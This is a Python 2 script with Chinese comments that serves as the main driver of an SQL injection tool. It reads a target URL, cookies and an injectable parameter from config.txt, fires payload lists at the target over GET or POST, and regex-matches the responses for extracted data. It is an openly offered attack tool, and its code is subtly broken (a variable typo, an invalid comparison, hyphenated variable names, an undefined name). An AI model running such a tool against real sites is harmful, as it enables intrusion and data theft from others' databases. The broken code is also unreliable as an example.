# -*- coding:utf-8 -*- 
#这个py文件是sql工具主文件，你需要在config.txt里定制合适你的攻击脚本
#建议使用前复制一份
####需要导入的模块
from SQLlib import *
import re,urllib,urllib2,sys
import ConfigParser

####不能修改的内容包括调试所需
last=''       #这个变量用于存放fd.read()上次读取的结果
createvar=locals()#创建全局变量需要

###配置文件处理
config = ConfigParser.ConfigParser()
config.read("config.txt")
funclist=config.get('fundamental','funclist').split('@')
way=config.get('fundamental','way')
url=config.get('fundamental','url')
query=eval(config.get('fundamental','query'))
inject=config.get('fundamental','inject')
result=config.get('fundamental','result')
usediffcome=config.getint('fundamental','usediffcome')
match=config.getint('fundamental','match')
goal=config.get('fundamental','goal')
pause=config.getint('fundamental','pause')
nulltest=config.getint('fundamental','nulltest')
for tup in config.items('header'):#动态生成header部分的头变量
    createvar[tup[0]]=tup[1]
    

"""----------------------------------------------------------------------------"""
def urlencode(s):#URL编码
    s=urllib.quote(s.decode('gbk','replace').encode('utf-8','replace'))
    return s


def diffcome(last,now):#出现和上次不同的回显时提醒我
    if last==now:
        pass
    else:
        print "[+][+][+][+][+]Attention:This page is different from last one!"
    return now

def check(string):
    matches=re.search(goal,string)
    if matches!=None:
        print "[+][+][+][+][+]We find goal!:"+matches.group(1)
    else:
        print "[-]Do not match goal"

def resultshow(fd,payload):#回显处理
    global last
    d=fd.read()
    if result=='html' or result=='all':
        print d+'\n'
    if result=='len' or result=='all':
        print "The length is "+str(len(d))+'.'+'And this result use payload'+payload
    if usediffcome==1:
        last=diffcome(last,d)
    if match==1:
        check(d)
    if pause==1:
        raw_input(">>>Any key is to continue...")
    print "------------------------------------------------------------\n"    
    
def header(req):##由于ConfigParser模块对配置文件选项读取后会转换为小写，这里均为小写变量
    if cookie!='':
        req.add_header('Cookie',cookie)
    if useragent!='':
        req.add_header('UserAgent',useragent)
    if referer!='':
        req.add_header('Referer',referer)
    if host!='':
        req.add_header('Host',host)
    if accept!='':
        req.add_header('Accept',accept)
    if accept-language!='':
        req.add_header('Accept-Language',accept-language)
    if accept-encoding!='':
        req.add_header('Accept-Encoding',accept-encoding)
    if connection!='':
        req.add_header('Connection',connection)
    return req
        

def sqlget(url,payload):#这里的url就是配置的url，payload是个字符串
    req=urllib2.Request(url+urlencode(payload))
    req=header(rea)
    fd=urllib2.urlopen(req)
    resultshow(fd,payload)

def sqlpost(url,payload):#这里的url就是配置的url，payload是个字符串
    global query,inject
    query[inject]=payload
    data=urllib.urlencode(query)
    req=urllib2.Request(url)
    req=header(req)
    fd=urllib2.urlopen(req,data)
    resultshow(fd,payload)
    
def exploit(payloads):#payloads是一个列表，可能是嵌套列表
    for p in payloads:  
        if isinstance(p,list)==True:
            exploit(p)
        else:
            if way=='GET':
                sqlget(url,p)
            elif way=='POST':
                sqlpost(url,p)
       

def main():
    i=1
    for func in funclist:
        print "******************************************************"
        print "               第"+str(i)+"个任务:"+f+"                         "
        print "******************************************************"
        if func=="":#为空不执行任何操作
            continue
        else:
            payloads=eval(func)#返回可能镶嵌的列表
            
        if nulltest=1:#是否开启空测试的参数
            payloads=['']+payloads
            
        exploit(payloads)
        print "\n\n\n"
        i+=1


    
if __name__=="__main__":
    main()

    
